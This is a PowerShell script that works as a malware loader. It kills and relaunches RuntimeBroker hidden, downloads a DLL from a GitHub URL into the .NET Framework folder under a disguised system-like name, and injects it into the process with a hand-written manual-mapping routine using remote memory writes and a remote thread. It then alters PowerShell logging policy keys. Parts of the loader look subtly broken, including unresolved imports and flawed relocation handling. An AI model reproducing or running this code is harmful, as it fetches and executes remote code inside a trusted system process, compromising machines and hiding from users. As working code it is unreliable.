$ErrorActionPreference = 'SilentlyContinue'
$dllPath = if ([Environment]::Is64BitOperatingSystem) { "$env:SystemRoot\Microsoft.NET\Framework64\sbscmp30_mscorwks.dll" } else { "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll" }
$processName = 'RuntimeBroker'
$processPath = "$env:SystemRoot\System32\$processName.exe"
Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2
New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
try { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $dllPath -ErrorAction Stop } catch { exit }
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class M {
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32", SetLastError=true)]
    static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32", SetLastError=true)]
    static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint f, out uint o);
    [DllImport("ntdll")] static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr a);
    public static bool ManualMap(int pid, byte[] dllBytes) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        if (hProcess == IntPtr.Zero) return false;
        IntPtr localImage = IntPtr.Zero;
        try {
            // Load DLL locally to get image size and entry point
            string tempFile = System.IO.Path.GetTempFileName() + ".dll";
            System.IO.File.WriteAllBytes(tempFile, dllBytes);
            IntPtr hModule = LoadLibrary(tempFile);
            if (hModule == IntPtr.Zero) { CloseHandle(hProcess); return false; }
            // Get image size from PE headers
            int e_lfanew = Marshal.ReadInt32(hModule + 0x3C);
            int sizeOfImage = Marshal.ReadInt32(hModule + e_lfanew + 0x50);
            IntPtr entryPointRva = (IntPtr)(Marshal.ReadInt32(hModule + e_lfanew + 0x28));
            IntPtr entryPoint = hModule + (int)entryPointRva;
            // Allocate memory in target
            IntPtr remoteImage = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sizeOfImage, 0x3000, 0x40); // PAGE_EXECUTE_READWRITE
            if (remoteImage == IntPtr.Zero) { CloseHandle(hProcess); return false; }
            // Copy headers and sections
            byte[] localCopy = new byte[sizeOfImage];
            Marshal.Copy(hModule, localCopy, 0, sizeOfImage);
            uint written;
            WriteProcessMemory(hProcess, remoteImage, localCopy, (uint)sizeOfImage, out written);
            // Fix relocations if necessary (simplified: assume no relocs needed if loaded at same base, but target address differs)
            // For a simple payload, we can ignore relocations if the DLL was built with a fixed base or we load at the same base.
            // We'll attempt to map at the preferred base stored in the PE header.
            long preferredBase = Marshal.ReadInt64(hModule + e_lfanew + 0x30); // ImageBase
            if (preferredBase != 0 && remoteImage != (IntPtr)preferredBase) {
                // Perform relocations
                uint relocDirRva = (uint)Marshal.ReadInt32(hModule + e_lfanew + 0xB0);
                uint relocDirSize = (uint)Marshal.ReadInt32(hModule + e_lfanew + 0xB4);
                if (relocDirSize > 0) {
                    long delta = (long)remoteImage - preferredBase;
                    int offset = 0;
                    while (offset < relocDirSize) {
                        int pageRva = Marshal.ReadInt32(hModule + (int)relocDirRva + offset);
                        int blockSize = Marshal.ReadInt32(hModule + (int)relocDirRva + offset + 4);
                        int count = (blockSize - 8) / 2;
                        for (int i = 0; i < count; i++) {
                            short type = Marshal.ReadInt16(hModule + (int)relocDirRva + offset + 8 + i * 2);
                            if (type == 0) continue;
                            int fieldRva = pageRva + (type & 0xFFF);
                            long fieldAddr = (long)remoteImage + fieldRva;
                            long oldVal = Marshal.ReadInt64(hModule + fieldRva);
                            long newVal = oldVal + delta;
                            WriteProcessMemory(hProcess, (IntPtr)fieldAddr, BitConverter.GetBytes(newVal), 8, out _);
                        }
                        offset += blockSize;
                    }
                }
            }
            // Call entry point
            IntPtr entryRemote = remoteImage + (int)entryPointRva;
            uint oldProtect;
            VirtualProtectEx(hProcess, entryRemote, 1, 0x20, out oldProtect); // PAGE_EXECUTE_READ
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, entryRemote, remoteImage, 0, IntPtr.Zero); // lpParameter = remoteImage (hinstDLL)
            if (hThread != IntPtr.Zero) {
                WaitForSingleObject(hThread, 5000);
                CloseHandle(hThread);
            }
            CloseHandle(hProcess);
            return true;
        } catch {
            return false;
        } finally {
            if (localImage != IntPtr.Zero) Marshal.FreeHGlobal(localImage);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }
}
'@ -ReferencedAssemblies System.Runtime.InteropServices
$proc = Start-Process -FilePath $processPath -PassThru -WindowStyle Hidden
Start-Sleep -Seconds 2
$running = Get-Process -Name $processName -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq $proc.Id }
if ($running) {
    $dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
    [M]::ManualMap($proc.Id, $dllBytes) | Out-Null
    Write-Host "Injected"
}
$basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
$sblPath = "$basePath\ScriptBlockLogging"
$modPath = "$basePath\ModuleLogging"
$transPath = "$basePath\Transcription"
$corePath = 'HKLM:\Software\Policies\Microsoft\PowerShellCore'
Set-ItemProperty -Path $sblPath -Name 'EnableScriptBlockLogging' -Value 1 -Force
Set-ItemProperty -Path $modPath -Name 'EnableModuleLogging' -Value 1 -Force
Set-ItemProperty -Path $transPath -Name 'EnableTranscripting' -Value 1 -Force
if (Test-Path "$corePath\ScriptBlockLogging") { Set-ItemProperty -Path "$corePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force }
if (Test-Path "$corePath\ModuleLogging") { Set-ItemProperty -Path "$corePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force }
